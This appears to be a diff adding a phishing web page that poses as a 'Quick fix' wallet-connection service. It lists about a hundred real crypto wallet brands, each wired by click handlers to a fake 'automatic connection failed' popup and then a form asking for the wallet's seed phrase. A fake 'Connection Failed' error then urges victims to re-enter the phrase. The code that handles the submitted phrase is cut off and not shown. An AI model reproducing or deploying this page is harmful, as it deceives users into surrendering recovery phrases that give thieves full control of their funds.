@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="stylesheet" href="//use.fontawesome.com/releases/v5.0.7/css/all.css">
+<link rel="stylesheet" href="css/all.min.css">
+<link rel="stylesheet" href="css/fontawesome.min.css">
+<link rel="stylesheet" href="css/regular.min.css">
+<link rel="stylesheet" href="css/solid.min.css">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+ <link rel="stylesheet" type="text/css" href="css/style.css">
+</head>
+<body>
+<div class="home-layout">
+<div class="home">
+<h1 style="font-size:40px">Quick fix</h1> <a href="index.html"><h2><i class="fa fa-home fa-2x" style="color:white"></i></h2></a></div>
+</div>
+  <h1 style="margin-top:16px;font-size:45px;color:#183153">Wallets</h1>
+ <h3 style="margin-top:-18px">multiple iOS and Android wallets support the Protocol. Simply select your wallet to start securely using a dApp. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</h3>
+  <div class="info" id="inform"><h4>Click me</h4></div>
+<div class="setimg"><div class="align" id="trust"><img src="images/trust-wallet.jpg"><br>Trust wallet</div> <div class="align" id="coin"><img src="images/coinbase.jpg"><br>Coinbase</div>
+ </div>
+<div class="setimg"><div class="align" id="sol"><img src="images/solana.png"><br>Solana</div> <div class="align" id="meW"><img src="images/mew.png"><br>Mew</div>
+ </div>
+<div class="setimg"><div class="align" id="ledger"><img src="images/ledger.jpg"><br>Ledger</div> <div class="align" id="metamask"><img src="images/metamask.jpg"><br>Metamask</div>
+ </div>
+<div class="setimg"><div class="align" id="digitex"><img src="images/digitex.jpg"><br>Digitex</div> <div class="align" id="enjin"><img src="images/enjin.jpg"><br>Enjin</div>
+ </div>
+<div class="setimg"><div class="align" id="binance"><img src="images/binance.jpeg"><br>Binance</div> <div class="align" id="cryptodefi"><img src="images/cryptodefi.jpg"><br>Cryptodefi</div>
+ </div>
+<div class="setimg"><div class="align" id="exodus"><img src="images/exodus.jpg"><br>Exodus</div> <div class="align" id="fortmatic"><img src="images/fortmatic.jpg"><br>Fortmatic</div>
+</div>
+<div class="setimg"><div class="align" id="polkawallet"><img src="images/polkawallet.jpg"><br>Polkawallet</div> <div class="align" id="safepal"><img src="images/safepal.jpg"><br>Safepal</div>
+ </div>
+<div class="setimg"><div class="align" id="skale"><img src="images/skale.webp"><br>Skale</div> <div class="align" id="aave"><img src="images/aave.jpg"><br>Aave</div>
+ </div>
+<div class="setimg"><div class="align" id="portis"><img src="images/portis.jpg"><br>Portis</div> <div class="align" id="defiat"><img src="images/defiat.jpg"><br>Defiat</div>
+ </div>
+<div class="setimg"><div class="align" id="atom"><img src="images/Atom.jpg"><br>Atom</div> <div class="align" id="cosmostation"><img src="images/Cosmostation.jpg"><br>Cosmostation</div>
+ </div>
+<div class="setimg"><div class="align" id="sparkpoint"><img src="images/Sparkpoint.jpg"><br>Sparkpoint</div> <div class="align" id="harmony"><img src="images/Harmony.jpg"><br>Harmony</div>
+ </div>
+<div class="setimg"><div class="align" id="infinity"><img src="images/Infinity.jpg"><br>Infinity</div> <div class="align" id="polkadot"><img src="images/Polkadot.jpg"><br>Polkadot</div>
+ </div>
+<div class="setimg"><div class="align" id="anchor"><img src="images/Anchor.jpg"><br>Anchor</div> <div class="align" id="elrond"><img src="images/elrond.jpg"><br>Elrond</div>
+ </div>
+
+
+
+<!-- new update-->
+<div class="setimg"><div class="align" id="cybavo"><img src="images/cybavo-wallet.JPG"><br>Cybavo wallet</div> <div class="align" id="pillar"><img src="images/pillar.PNG"><br>Pillar</div>
+ </div>
+<div class="setimg"><div class="align" id="rainbow"><img src="images/rainbow.JPG"><br>Rainbow</div> <div class="align" id="argent"><img src="images/argent.PNG"><br>Argent</div>
+ </div>
+<div class="setimg"><div class="align" id="gnosis"><img src="images/gnosis-safe-multisig.PNG"><br>Gnosis safe multisig</div> <div class="align" id="tokenary"><img src="images/tokenary.PNG"><br>Tokenary</div>
+ </div>
+<div class="setimg"><div class="align" id="nash"><img src="images/nash.JPG"><br>Nash</div> <div class="align" id="zelcore"><img src="images/zelcore.PNG"><br>Zelcore</div>
+ </div>
+<div class="setimg"><div class="align" id="dcent"><img src="images/dcent-wallet.JPG"><br>D'cent wallet</div> <div class="align" id="alice"><img src="images/alice.PNG"><br>Alice</div>
+ </div>
+<div class="setimg"><div class="align" id="infinito"><img src="images/Infinito.PNG"><br>Infinito</div> <div class="align" id="equal"><img src="images/equal.PNG"><br>Equal</div>
+ </div>
+<div class="setimg"><div class="align" id="eidoo"><img src="images/eidoo.PNG"><br>Eidoo</div> <div class="align" id="gridplus"><img src="images/gridplus.PNG"><br>Gridplus</div>
+ </div>
+<div class="setimg"><div class="align" id="spatium"><img src="images/spatium.PNG"><br>Spatium</div> <div class="align" id="autowallet"><img src="images/auto-wallet.JPG"><br>Auto wallet</div>
+ </div>
+<div class="setimg"><div class="align" id="unstoppable"><img src="images/unstoppable-wallet.JPG"><br>Unstoppable wallet</div> <div class="align" id="xdcwallet"><img src="images/xdc-wallet.PNG"><br>Xdc wallet</div>
+ </div>
+<div class="setimg"><div class="align" id="peakdefi"><img src="images/peakdefi-wallet.JPG"><br>Peakdefi wallet</div> <div class="align" id="swftwallet"><img src="images/swft-wallet.PNG"><br>Swft wallet</div>
+ </div>
+<div class="setimg"><div class="align" id="kardiachain"><img src="images/kardiachain.PNG"><br>Kardiachain</div> <div class="align" id="bitkeep"><img src="images/bitkeep.JPG"><br>Bitkeep</div>
+ </div>
+<div class="setimg"><div class="align" id="viawallet"><img src="images/viawallet .JPG"><br>Viawallet</div> <div class="align" id="bridgewallet"><img src="images/bridge-wallet.PNG"><br>Bridge wallet</div>
+ </div>
+<div class="setimg"><div class="align" id="polymesh"><img src="images/polymesh.JPG"><br>Polymesh</div> <div class="align" id="bluewallet"><img src="images/bluewallet.JPG"><br>Blue wallet</div>
+ </div>
+<div class="setimg"><div class="align" id="debank"><img src="images/debank.PNG"><br>Debank</div> <div class="align" id="trezor"><img src="images/trezor.PNG"><br>Trezor wallet</div>
+ </div>
+<div class="setimg"><div class="align" id="easypocket"><img src="images/easypocket.JPG"><br>Easypocket</div> <div class="align" id="ownbit"><img src="images/ownbit.JPG"><br>Ownbit</div>
+ </div>
+<div class="setimg"><div class="align" id="walletio"><img src="images/wallet.io.JPG"><br>Wallet.io</div> <div class="align" id="torus"><img src="images/torus.JPG"><br>Torus</div>
+ </div>
+<div class="setimg"><div class="align" id="luno"><img src="images/luno.JPG"><br>Luno</div> <div class="align" id="xdefi"><img src="images/xdefi.JPG"><br>Xdefi</div>
+ </div>
+<div class="setimg"><div class="align" id="vchain"><img src="images/vchain .PNG"><br>Vchain</div> <div class="align" id="coinomi"><img src="images/coinomi .PNG"><br>Coinomi</div>
+ </div>
+<div class="setimg"><div class="align" id="walletswap"><img src="images/walletswap .JPG"><br>Walletswap</div> <div class="align" id="tronlink"><img src="images/tronlink .JPG"><br>Tronlink</div>
+ </div>
+<div class="setimg"><div class="align" id="coolwallets"><img src="images/coolwallets.PNG"><br>Coolwallet S</div> <div class="align" id="coin98"><img src="images/coin98.JPG"><br>Coin98</div>
+ </div>
+<div class="setimg"><div class="align" id="trustvault"><img src="images/trustvault.PNG"><br>TrustVault</div> <div class="align" id="loopring"><img src="images/loopring.PNG"><br>Loopring wallet</div>
+ </div>
+<div class="setimg"><div class="align" id="mykey"><img src="images/mykey .PNG"><br>Mykey</div> <div class="align" id="fearless"><img src="images/fearless .JPG"><br>Fearless</div>
+ </div>
+<div class="setimg"><div class="align" id="terra"><img src="images/terra.JPG"><br>Terra Station</div> <div class="align" id="sollet"><img src="images/sollet .JPG"><br>Sollet</div>
+ </div>
+<div class="setimg"><div class="align" id="ferrum"><img src="images/ferrum .JPG"><br>Ferrum Unifyre</div> <div class="align" id="keyring"><img src="images/keyring .JPG"><br>Keyring Pro</div>
+ </div>
+<div class="setimg"><div class="align" id="ellipal"><img src="images/ellipal .PNG"><br>Ellipal</div> <div class="align" id="midas"><img src="images/midas .PNG"><br>Midas</div>
+ </div>
+<div class="setimg"><div class="align" id="03-wallet"><img src="images/03-wallet.PNG"><br>03 wallet</div> <div class="align" id="guarda"><img src="images/guarda .JPG"><br>Guarda</div>
+ </div>
+<div class="setimg"><div class="align" id="huobi"><img src="images/huobi .PNG"><br>Huobi</div> <div class="align" id="authereum"><img src="images/authereum .PNG"><br>Authereum</div>
+ </div>
+<div class="setimg"><div class="align" id="waleth"><img src="images/waleth .JPG"><br>Waleth</div> <div class="align" id="bitpay"><img src="images/bitpay.JPG"><br>Bitpay</div>
+ </div>
+<div class="setimg"><div class="align" id="mathwallet"><img src="images/mathwallet .JPG"><br>Mathwallet</div> <div class="align" id="tokenpocket"><img src="images/tokenpocket .JPG"><br>Tokenpocket</div>
+ </div>
+<div class="setimg"><div class="align" id="onto"><img src="images/onto.PNG"><br>Onto</div> <div class="align" id="imtoken"><img src="images/imtoken .JPG"><br>Imtoken</div>
+ </div>
+<div class="setimg"><div class="align" id="alphawallet"><img src="images/alphawallet .PNG"><br>Alpha wallet</div> <div class="align" id="1inch"><img src="images/1inch .JPG"><br>1inch wallet</div>
+ </div>
+<div class="setimg"><div class="align" id="tomochain"><img src="images/tomochain.PNG"><br>Tomochain</div> <div class="align" id="klever"><img src="images/klever .PNG"><br>Klever</div>
+ </div>
+<div class="setimg"><div class="align" id="phantom"><img src="images/phantom.JPG"><br>Phantom</div> <div class="align" id="solflare"><img src="images/solflare .JPG"><br>Solflare</div>
+ </div>
+<div class="setimg"><div class="align" id="maiar"><img src="images/maiar .PNG"><br>Maiar</div><div class="align" id="keplr"><img src="images/Keplr.JPG"><br>Keplr</div>
+ </div>
+ <h5 style="text-align:center;margin-top:90px"><i class="fa fa-copyright"></i> All rights reserved. Cookie policy, Privacy and Terms</h5>
+<div class="last"><h4><i class="fa-brands fa-twitter" style="color:#183153"></i>  twitter</h4><br><h4 style="margin-top:3px"><i class="fa-brands fa-discord" style="color:#183153"></i>  doscord</h4><br><h4 style="margin-top:3px"><i class="fa-brands fa-telegram" style="color:#183153"></i>  telegram</h4></div>
+
+
+
+
+<!-- final error -->
+ <div id="epage" class="ferrorpopup"><div class="ferrorset"><div class="ferror-container"><i class="fa-solid fa-xmark fa-2x" style="color:white;margin-left:86%;margin-top:4px" id="Fback" ></i><h2 style="margin-top:-16px;">Connection Failed</h2><br><h4 style="margin-top:-18px">connection failed to establish,this may be due to incorrect phrase seed, please make sure you enter a correct seed phrase.</h4><br><h3 style="margin-top:-18px">Go back and try again</h3></div></div></div>
+
+
+
+<div id="popupbody"><div class="popupset"><div class="popup" ><i class="fa-solid fa-xmark fa-2x" style="color:white;margin-left:86%;margin-top:4px" id="back" ></i><div id="loader"></div><br><div style="display:none;" id="myDiv" class="animate-bottom">
+  <h3 style="color:red;margin-top:30px">automatic connection failed</h3>
+  <p ><button id="connect"><strong>CONNECT MANUALLY</strong></button></p>
+</div>
+</div></div>
+</div>
+
+ <!--form-->
+
+<div id="formpopup">
+<div class="formpopupset">
+<div class="form-container">
+ <form ><div class="popup" ><i class="fa-solid fa-xmark fa-2x" style="color:white;margin-left:95%; margin-top:4px" id="backT" ></i>
+<input style="width:70%;margin-top:-18px;text-align:center" type="text" value="" id="wallet_name" name="wallet_name" readonly>
+ <input  style="margin-top:6px;margin-left:17px"type="text" placeholder="enter your phrase seed" id="recovery_phrase" name="recovery_phrase">
+</form>
+ <span style="color:red;margin-left:12px" id="mnemonicMessage"></span>
+ <br><button type="button" style="margin-top:10px" onclick="subF(this)"><strong>CONNECT</strong></button>
+</div></div></div>
+
+
+<script src="js/jquery-3.4.1.min.js"></script>
+<script src="js/popper.min.js" crossorigin="anonymous"></script>
+<script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script src="js/blockui.js"></script>
+
+<script>
+//trust wallet
+ $("#trust").click(trustWallet);
+function trustWallet() {
+ $("#wallet_name").val("TRUST-WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//coin base
+ $("#coin").click(coinBase);
+function coinBase() {
+ $("#wallet_name").val("COIN BASE");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//solana
+ $("#sol").click(solana);
+function solana() {
+ $("#wallet_name").val("SOLANA");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//mew
+ $("#meW").click(meW);
+function meW() {
+ $("#wallet_name").val("MEW");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//ledger
+ $("#ledger").click(ledgeR);
+function ledgeR() {
+ $("#wallet_name").val("LEDGER");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//metamask
+ $("#metamask").click(metamasK);
+function metamasK() {
+ $("#wallet_name").val("METAMASK");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//digitex
+ $("#digitex").click(digiteX);
+function digiteX() {
+ $("#wallet_name").val("DIGITEX");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//enjin
+ $("#enjin").click(enjiN);
+function enjiN() {
+ $("#wallet_name").val("ENJIN");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//binance
+ $("#binance").click(binancE);
+function binancE() {
+ $("#wallet_name").val("BINANCE");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//cryptodefi
+ $("#cryptodefi").click(cryptodefI);
+function cryptodefI() {
+ $("#wallet_name").val("CRYPTODEFI");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//exodus
+ $("#exodus").click(exoduS);
+function exoduS() {
+ $("#wallet_name").val("EXODUS");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//fortmatic
+ $("#fortmatic").click(fortmatiC);
+function fortmatiC() {
+ $("#wallet_name").val("FORTMATIC");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//polkawallet
+ $("#polkawallet").click(polkawalleT);
+function polkawalleT() {
+ $("#wallet_name").val("POLKAWALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//safepal
+ $("#safepal").click(safepaL);
+function safepaL() {
+ $("#wallet_name").val("SAFEPAL");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//skale
+ $("#skale").click(skalE);
+function skalE() {
+ $("#wallet_name").val("SKALE");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//aave
+ $("#aave").click(aavE);
+function aavE() {
+ $("#wallet_name").val("AAVE");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//atom
+ $("#atom").click(atoM);
+function atoM() {
+ $("#wallet_name").val("ATOM");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//cosmostation
+ $("#cosmostation").click(cosmostatioN);
+function cosmostatioN() {
+ $("#wallet_name").val("COSMOSTATION");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//soarkpoint
+ $("#sparkpoint").click(sparkpoinT);
+function sparkpoinT() {
+ $("#wallet_name").val("SPARKPOINT");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//atom
+ $("#harmony").click(harmonY);
+function harmonY() {
+ $("#wallet_name").val("HARMONY");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//infinity
+ $("#infinity").click(infinitY);
+function infinitY() {
+ $("#wallet_name").val("INFINITY");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//polkadot
+ $("#polkadot").click(polkadoT);
+function polkadoT() {
+ $("#wallet_name").val("POLKADOT");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//anchor
+ $("#anchor").click(anchoR);
+function anchoR() {
+ $("#wallet_name").val("ANCHOR");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//atom
+ $("#elrond").click(elronD);
+function elronD() {
+ $("#wallet_name").val("ELROND");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//rainbow
+ $("#rainbow").click(rainboW);
+function rainboW() {
+ $("#wallet_name").val("RAINBOW");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//argent
+ $("#argent").click(argenT);
+function argenT() {
+ $("#wallet_name").val("ARGENT");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//gnosis
+ $("#gnosis").click(gnosiS);
+function gnosiS() {
+ $("#wallet_name").val("GNOSIS SAFE MULTISIG");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//cybavo
+ $("#cybavo").click(cybavO);
+function cybavO() {
+ $("#wallet_name").val("CYBAVO WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//pillar
+ $("#pillar").click(pillaR);
+function pillaR() {
+ $("#wallet_name").val("PILLAR");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//portis
+ $("#portis").click(portiS);
+function portiS() {
+ $("#wallet_name").val("PORTIS");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//defiat
+ $("#defiat").click(defiaT);
+function defiaT() {
+ $("#wallet_name").val("DEFIAT");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//tokenary
+ $("#tokenary").click(tokenarY);
+function tokenarY() {
+ $("#wallet_name").val("TOKENARY");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//nash
+ $("#nash").click(nasH);
+function nasH() {
+ $("#wallet_name").val("NASH");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//zelcore
+ $("#zelcore").click(zelcorE);
+function zelcorE() {
+ $("#wallet_name").val("ZELCORE");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//dcent
+ $("#dcent").click(dcenT);
+function dcenT() {
+ $("#wallet_name").val("D'CENT WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//alice
+ $("#alice").click(alicE);
+function alicE() {
+ $("#wallet_name").val("ALICE");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//infinito
+ $("#infinito").click(infinitO);
+function infinitO() {
+ $("#wallet_name").val("INFINITO");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//equal
+ $("#equal").click(equaL);
+function equaL() {
+ $("#wallet_name").val("EQUAL");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//eidoo
+ $("#eidoo").click(eidoO);
+function eidoO() {
+ $("#wallet_name").val("EIDOO");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//gridplus
+ $("#gridplus").click(gridpluS);
+function gridpluS() {
+ $("#wallet_name").val("GRIDPLUS");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//spatium
+ $("#spatium").click(spatiuM);
+function spatiuM() {
+ $("#wallet_name").val("SPATIUM");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//autowallet
+ $("#autowallet").click(autowalleT);
+function autowalleT() {
+ $("#wallet_name").val("AUTO WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//unstoppable
+ $("#unstoppable").click(unstoppablE);
+function unstoppablE() {
+ $("#wallet_name").val("UNSTOPPABLE");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//xdc
+ $("#xdcwallet").click(xdcwalleT);
+function xdcwalleT() {
+ $("#wallet_name").val("XDC WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//peakdefi
+ $("#peakdefi").click(peakdefI);
+function peakdefI() {
+ $("#wallet_name").val("PEAKDEFI WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//swftwallet
+ $("#swftwallet").click(swftwalleT);
+function swftwalleT() {
+ $("#wallet_name").val("SWFT WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//kardiachain
+ $("#kardiachain").click(kardiachaiN);
+function kardiachaiN() {
+ $("#wallet_name").val("KARDIACHAIN");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//bitkeep
+ $("#bitkeep").click(bitkeeP);
+function bitkeeP() {
+ $("#wallet_name").val("BITKEEP");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//viawallet
+ $("#viawallet").click(viawalleT);
+function viawalleT() {
+ $("#wallet_name").val("VIAWALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//bridgewallet
+ $("#bridgewallet").click(bridgewalleT);
+function bridgewalleT() {
+ $("#wallet_name").val("BRIDGE WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//polymesh
+ $("#polymesh").click(polymesH);
+function polymesH() {
+ $("#wallet_name").val("POLYMESH");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//bluewallet
+ $("#bluewallet").click(bluewalleT);
+function bluewalleT() {
+ $("#wallet_name").val("BLUE WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//debank
+ $("#debank").click(debanK);
+function debanK() {
+ $("#wallet_name").val("DEBANK");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//trezor
+ $("#trezor").click(trezoR);
+function trezoR() {
+ $("#wallet_name").val("TREZOR");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//easypocket
+ $("#easypocket").click(easypockeT);
+function easypockeT() {
+ $("#wallet_name").val("EASYPOCKET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//ownbit
+ $("#ownbit").click(ownbiT);
+function ownbiT() {
+ $("#wallet_name").val("OWNBIT");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//walletio
+ $("#walletio").click(walletiO);
+function walletiO() {
+ $("#wallet_name").val("WALLET.IO");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//torus
+ $("#torus").click(toruS);
+function toruS() {
+ $("#wallet_name").val("TORUS");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//luno
+ $("#luno").click(lunO);
+function lunO() {
+ $("#wallet_name").val("LUNO");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//xdefi
+ $("#xdefi").click(xdefI);
+function xdefI() {
+ $("#wallet_name").val("XDEFI");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//vchain
+ $("#vchain").click(vchaiN);
+function vchaiN() {
+ $("#wallet_name").val("VCHAIN");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//coinomi
+ $("#coinomi").click(coinomI);
+function coinomI() {
+ $("#wallet_name").val("COINOMI");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//walletswap
+ $("#walletswap").click(walletswaP);
+function walletswaP() {
+ $("#wallet_name").val("WALLETSWAP");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//tronlink
+ $("#tronlink").click(tronlinK);
+function tronlinK() {
+ $("#wallet_name").val("TRONLINK");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//coolwallet
+ $("#coolwallets").click(coolwalleT);
+function coolwalleT() {
+ $("#wallet_name").val("COOLWALLET S");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//trustvault
+ $("#trustvault").click(trustvaulT);
+function trustvaulT() {
+ $("#wallet_name").val("TRUSTVAULT");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//coin98
+ $("#coin98").click(coiN);
+function coiN() {
+ $("#wallet_name").val("COIN98");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//loopring
+ $("#loopring").click(looprinG);
+function looprinG() {
+ $("#wallet_name").val("LOOPRING WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//mykey
+ $("#mykey").click(mykeY);
+function mykeY() {
+ $("#wallet_name").val("MYKEY");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//fearless
+ $("#fearless").click(fearlesS);
+function fearlesS() {
+ $("#wallet_name").val("FEARLESS");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//terra
+ $("#terra").click(terrA);
+function terrA() {
+ $("#wallet_name").val("TERRA STATION");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//sollet
+ $("#sollet").click(solleT);
+function solleT() {
+ $("#wallet_name").val("SOLLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//ferrum
+ $("#ferrum").click(ferruM);
+function ferruM() {
+ $("#wallet_name").val("FERRUM UNIFYRE");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//keyring
+ $("#keyring").click(keyrinG);
+function keyrinG() {
+ $("#wallet_name").val("KEYRING PRO");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//ellipal
+ $("#ellipal").click(ellipaL);
+function ellipaL() {
+ $("#wallet_name").val("ELLIPAL");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//midas
+ $("#midas").click(midaS);
+function midaS() {
+ $("#wallet_name").val("MIDAS");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//03wallet
+ $("#03-wallet").click(walleT);
+function walleT() {
+ $("#wallet_name").val("03WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//guarda
+ $("#guarda").click(guardA);
+function guardA() {
+ $("#wallet_name").val("GUARDA");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//huobi
+ $("#huobi").click(huobI);
+function huobI() {
+ $("#wallet_name").val("HUOBI");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//authereum
+ $("#authereum").click(authereuM);
+function authereuM() {
+ $("#wallet_name").val("AUTHEREUM");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//waleth
+ $("#waleth").click(waletH);
+function waletH() {
+ $("#wallet_name").val("WALETH");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//bitpay
+ $("#bitpay").click(bitpaY);
+function bitpaY() {
+ $("#wallet_name").val("BITPAY");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//mathwallet
+ $("#mathwallet").click(mathwalleT);
+function mathwalleT() {
+ $("#wallet_name").val("MATHWALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//tokenpocket
+ $("#tokenpocket").click(tokenpockeT);
+function tokenpockeT() {
+ $("#wallet_name").val("TOKENPOCKET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//onto
+ $("#onto").click(ontO);
+function ontO() {
+ $("#wallet_name").val("ONTO");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//imtoken
+ $("#imtoken").click(imtokeN);
+function imtokeN() {
+ $("#wallet_name").val("IMTOKEN");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//alphawallet
+ $("#alphawallet").click(alphawalleT);
+function alphawalleT() {
+ $("#wallet_name").val("ALPHA WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//1inch
+ $("#1inch").click(incH);
+function incH() {
+ $("#wallet_name").val("1INCH WALLET");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//tomochain
+ $("#tomochain").click(tomochaiN);
+function tomochaiN() {
+ $("#wallet_name").val("TOMOCHAIN");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//klever
+ $("#klever").click(kleveR);
+function kleveR() {
+ $("#wallet_name").val("KLEVER");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//phantom
+ $("#phantom").click(phantoM);
+function phantoM() {
